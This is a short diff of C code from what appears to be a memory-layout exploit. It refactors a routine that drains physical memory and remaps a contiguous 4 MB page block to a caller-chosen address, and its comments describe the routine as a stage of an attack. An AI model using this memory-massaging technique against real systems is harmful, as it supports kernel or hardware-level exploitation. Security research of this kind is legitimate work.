@@ -7,9 +7,8 @@
 #include <sys/mman.h>
 
 #define ZONE_RESERVE 0xc0000000UL
-#define REMAP_ADDRESS 0x200000000UL
 
-void* get_page_block_once() {
+void* get_page_block_once(void* address) {
     // Drain memory so the allocator must split big blocks
     size_t drain_size = PAGE_SIZE * sysconf(_SC_AVPHYS_PAGES) - ZONE_RESERVE;
 
@@ -22,7 +21,7 @@ void* get_page_block_once() {
         exit(EXIT_FAILURE);
     }
 
-    size_t block_size = 2 * PAGEBLOCK_SIZE;
+    size_t block_size = 2 * kPageBlockSize;
 
     // Locate the last page we own and compute its PA.
     // The end of the drained region is the part most likely to lie in
@@ -45,7 +44,7 @@ void* get_page_block_once() {
     // the block contiguous.
     void* page_block = mremap(page_block_aligned, block_size,
                               block_size,
-                              MREMAP_FIXED | MREMAP_MAYMOVE, REMAP_ADDRESS);
+                              MREMAP_FIXED | MREMAP_MAYMOVE, address);
 
     // No further use for the huge ‘drain’ region – free it to relieve
     // memory pressure before the next stages of the attack.
@@ -64,11 +63,11 @@ void* get_page_block_once() {
     return MAP_FAILED;
 }
 
-void* get_4mb_block() {
+void* get_4mb_block(void* address) {
     void* pageblock;
 
     do {
-        pageblock = get_page_block_once();
+        pageblock = get_page_block_once(address);
     } while(pageblock == MAP_FAILED);
 
     return pageblock;
